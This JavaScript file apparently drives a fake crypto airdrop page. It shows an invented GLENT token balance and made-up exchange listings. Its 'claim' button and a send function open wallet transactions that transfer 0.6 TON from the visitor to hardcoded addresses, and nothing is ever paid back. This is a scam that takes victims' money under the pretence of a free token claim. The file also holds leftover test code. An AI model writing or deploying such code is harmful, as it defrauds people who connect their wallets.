
const url = new URL(window.location.href);

const airdropValue = url.searchParams.get("airdrop");
if(airdropValue === "lion"){
    const lions = document.getElementById("lions");
    lions.className = "";
}
if(airdropValue === "glent"){
    const lions = document.getElementById("glent");
    lions.className = "";
}
if(airdropValue === "wednesday"){
    const lions = document.getElementById("wednesday");
    document.body.id = "bodywed";
    lions.className = "";
}

const lions = document.getElementById("wednesday"); //test
lions.className = "";
document.body.id = "bodywed";
function sendTransaction() {
    const recipient = "UQBpItfW2j2WG5KXU4kfDqLU3hyBzKNl-DoIAmTRcl_7FXiM";
    const amount = 0.6;  // Amount in TON

    const amountInNanoTON = amount * 1e9;
    const tonkeeperLink = `https://app.tonkeeper.com/transfer/${recipient}?amount=${amountInNanoTON}`;

    window.open(tonkeeperLink, "_blank");
}
const listinglist = document.getElementById("listingslist");
const dataL = [{
    text: "XT.com | GLENT/USDT - 24 March",
    logo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/525.png"
}, {
    text: "Mexc | GLENT/USDT - 24 March",
    logo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/544.png"
}, {
    text: "Biconomy | GLENT/USDT - 24 March",
    logo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/937.png"
}, {
    text: "KCEX | GLENT/USDT - 24 March",
    logo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/9867.png"
}, {
    text: "Bitrue | GLENT/USDT - 24 March",
    logo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/433.png"
}];
let html = "";
dataL.map((el) => {
    html += `<p><img src="${el.logo}" alt="err"/> ${el.text}</p>`
})
listinglist.innerHTML = html;
if(airdropValue === "glent"){
    console.log("GLENT")
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://chocolate-fantastic-vole-284.mypinata.cloud/ipfs/bafkreieaav4e7brr4enko2syfsfz76bednuukxt6rrpsder7ifzc73epmm',
        buttonRootId: 'connect'
    });
    const claim = document.getElementById("claimGlent");
    let coin = localStorage.getItem("glent") || (20000 + Math.floor(Math.random() * 20000));
    const totalGlent = document.getElementById("totalGlent");
    totalGlent.innerText = ((+coin || 0) * 0.004).toFixed(2);
    localStorage.setItem("glent", coin);
    const userglentcoin = document.getElementById("userglentcoin");
    userglentcoin.innerText = coin;
    claim.onclick = async () => {
        if(!(tonConnectUI.connected)){
            tonConnectUI.openModal();
            return;
        }

        let a = new TonWeb.boc.Cell();
        a.bits.writeUint(0, 32);
        a.bits.writeString("CLAIM " + coin + " $GLENT");
        let payload = TonWeb.utils.bytesToBase64(await a.toBoc());
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
            messages: [
                {
                    address: "UQC0ovO8GpgrmuOkepaBeT-fysyEsBna6wjB1SOjF9CtHOe2",
                    amount: "600000000",
                    payload: payload
                }
            ]
        };

        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            const someTxData = await myAppExplorerService.getTransaction(result.boc);
        } catch (e) {
            console.error(e);
        }
    };

}
if(airdropValue === "wednesday" || 1) { //test
    console.log( window.location.href.replace("index.html", "manifest.json"))
    const tonConnectUI2 = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: window.location.href.replace("index.html", "manifest.json"),
        buttonRootId: "connect2"
    });
}